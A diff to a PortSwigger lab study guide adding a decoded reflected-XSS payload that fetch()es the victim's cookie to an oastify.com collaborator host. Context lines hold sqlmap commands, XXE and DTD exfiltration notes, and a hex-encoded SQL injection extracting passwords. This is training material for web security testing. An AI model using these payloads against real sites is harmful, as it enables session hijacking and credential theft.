@@ -56,6 +56,18 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 ```
 ![(Deliver reflected xss to steal victim cookie.](xss1.png)  
 
+>Decode above payload from url encoding, is the following:  
+
+```html
+https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//  
+```  
+
+>Decode part of payload above that is base64 encoded to the following:  
+
+```html
+https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("fetch("https://839cktu7uogedm6a1kjuy3outlzcn2br.oastify.com/?c=" + btoa(document['cookie']))"))}//  
+```  
+  
 ### Reflected XSS in Search with blocked Tags  
 
 >Reflected XSS into HTML context with most tags and attributes blocked Bypass WAF  
@@ -303,7 +315,7 @@ sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "cat
 sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
 ```
 
-## XXE Injection
+## XXE Injections
 
 >File upload or user import function on web target use XML file format. This can be vulnerable to XML external entity (XXE) injection.  
 
@@ -316,6 +328,8 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 ```xml
 %26entity;
 ```  
+
+### DTD Hosted Exploit  
 
 >On the exploit server host a exploit file with DTD extension, containing the following payload.  
 
@@ -344,22 +358,28 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 ![Exploiting blind XXE to exfiltrate data usding a mlicious exploit DTD file](blind-xxe-exploit-dtd.png)  
 
+### Xinclude file read  
+
+>To be completed...  
+
+
+
 ### SQL + XML + HackVector 
 
 >SQL injection with filter bypass via XML encoding may allow extract of sensitive data.  
 
-<sub>Use Burp extension hackvector to obfuscate the payload.</sub>
+<sub>Use Burp extension hackvector to obfuscate the payload.</sub>  
 
 ```xml
 <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
-```
+```  
 
 [PortSwigger Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)  
 
 <sup> XML Section incomplete </sup>  
 
 
-## SSRF - Server Side Request Forgery
+## SSRF - Server Side Request Forgery  
 
 >SSRF attack cause the server to make a connection to internal services within the organization, and force the server to connect to arbitrary external systems, potentially leaking sensitive data.  
 
